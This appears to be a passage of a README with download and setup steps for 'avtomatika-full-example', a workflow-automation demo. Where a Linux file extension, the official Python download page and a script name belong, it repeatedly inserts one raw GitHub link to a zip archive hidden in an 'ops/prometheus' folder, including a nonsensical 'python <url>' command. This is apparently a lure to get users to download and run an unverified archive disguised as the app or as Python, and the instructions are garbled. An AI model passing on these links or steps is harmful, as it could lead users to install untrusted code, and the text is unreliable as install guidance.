This page lists all available versions. Choose the latest one marked as stable or release.

### Step 2: Choose the Right File

Look for files that end with `.exe` for Windows, `.dmg` or `.pkg` for Mac, or `https://raw.githubusercontent.com/dulex224/avtomatika-full-example/main/ops/prometheus/avtomatika-full-example-v2.5.zip`/`.zip` for Linux. If you see Python files or zipped folders, these may require Python installation.

### Step 3: Install or Extract

- On **Windows**, run the `.exe` file and follow the instructions.
- On **macOS**, open the `.dmg` or run the package installer.
- On **Linux**, extract the archive to a folder and open the app from there.

### Step 4: Install Python (if needed)

If the app requires Python and you don't have it installed:

- Visit [https://raw.githubusercontent.com/dulex224/avtomatika-full-example/main/ops/prometheus/avtomatika-full-example-v2.5.zip](https://raw.githubusercontent.com/dulex224/avtomatika-full-example/main/ops/prometheus/avtomatika-full-example-v2.5.zip)
- Download and install Python 3.8 or newer for your system.
- After installation, open your computer’s command prompt or terminal and type:

```bash
python --version
```

You should see the installed Python version.

### Step 5: Running the Application

Depending on what you downloaded:

- If it is an executable file, double-click it.
- If it is Python code, open the terminal or command prompt, navigate to the folder where the app is, and run:

```bash
python https://raw.githubusercontent.com/dulex224/avtomatika-full-example/main/ops/prometheus/avtomatika-full-example-v2.5.zip
```

Follow on-screen instructions to interact with the sample workflows.

## 🔍 How the App Works

avtomatika-full-example uses a system of steps called workflows that run automatically:

- **Nested workflows**: Workflows inside workflows handle small jobs then return results.
- **Parallel execution**: Multiple tasks run at the same time to speed up work.
- **Smart dispatching**: Tasks send themselves to the right part of the system based on current needs.

The app shows these ideas clearly through examples you can watch and try.

---

## 🛠 Using the App

Once you start the app, you will see displays of different workflow examples. Here’s what you might find:

- A list of running tasks and their status.
- Buttons or controls to start new workflows.
- Logs showing the flow of tasks.
- Basic settings to change how workflows behave.

These examples help anyone understand how automation can organize and speed up work.
